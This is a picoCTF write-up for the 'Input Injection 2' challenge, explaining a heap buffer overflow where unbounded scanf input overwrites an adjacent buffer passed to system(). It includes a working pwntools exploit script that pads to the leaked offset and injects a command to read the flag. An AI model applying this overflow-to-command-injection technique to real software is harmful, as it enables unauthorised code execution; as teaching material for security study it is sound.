# Input Injection 2

**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Platform:** picoCTF  

---

## ğŸ“ Description

This program greets you and then runs a command.  
But can you take control of what command it executes?

---

## ğŸ” Challenge Overview

We are provided with two files:

- `vuln` (compiled binary)
- `vuln.c` (source code)

The goal is to analyze the binary, identify the vulnerability, and manipulate the program to execute our own command in order to retrieve the flag.

---

## ğŸ§ª Step 1 â€“ Initial Analysis

First, make the binary executable:

```bash
chmod +x vuln
```

Running the program produces output similar to:

```
username at 0xb19d2a0
shell at 0xb19d2d0
Enter username:
```

After entering a username (e.g., `josh`), the program responds:

```
Hello, josh. Your shell is /bin/pwd
```

It then executes `/bin/pwd`, which prints the current working directory.

At this point, we notice something important:

- The program leaks two heap addresses:
  - Address of `username`
  - Address of `shell`

This is a major hint.

---

## ğŸ”¬ Step 2 â€“ Source Code Review

Examining `vuln.c`, we observe:

- Two buffers are allocated **contiguously on the heap**, each 28 bytes:
  - `username`
  - `shell`
- `/bin/pwd` is copied into `shell`
- User input is read into `username` using:

```c
scanf("%s", username);
```

âš ï¸ **Vulnerability Identified: Heap-Based Buffer Overflow**

`scanf("%s", ...)` does not enforce bounds checking.

If we provide input longer than 28 bytes:

- The overflow will overwrite adjacent heap memory
- Since `shell` is allocated right after `username`, we can overwrite it
- The program later executes `system(shell)`

This means we can control the command being executed.

---

## ğŸ’£ Step 3 â€“ Exploitation Strategy

1. Leak both heap addresses (already printed by the program).
2. Compute the exact offset between `username` and `shell`:
   ```
   offset = shell_address - username_address
   ```
3. Send:
   - Padding to fill `username`
   - Additional bytes to overwrite `shell`
   - Our malicious command instead of `/bin/pwd`

Once overwritten, `system(shell)` executes our command.

---

## ğŸš€ Step 4 â€“ Exploit Script

```python
from pwn import *

p = remote("hostname", port)


addrs = [int(p.recvline().split()[-1], 16) for _ in range(2)]

# Wait for input prompt
p.recvuntil(b"username: ")


payload = b"A" * (addrs[1] - addrs[0]) + b"cat flag.txt"


p.sendline(payload)


print(p.recvline().decode())

p.close()
```

---

## ğŸ§  Why This Works

- Heap allocations are contiguous.
- No bounds checking is performed on `username`.
- Overflow allows us to overwrite `shell`.
- `system(shell)` executes whatever string we inject.

This transforms a simple greeting program into a command execution vulnerability.

---

## ğŸ Final Flag

```
picoCTF{us3rn4m3_2_sh3ll_redacted}
```

---

## ğŸ“š Key Takeaways

- Never use `scanf("%s")` without length constraints.
- Heap-based overflows can be just as dangerous as stack overflows.
- Leaking memory addresses simplifies exploitation significantly.
- Always validate and restrict user-controlled input.

---
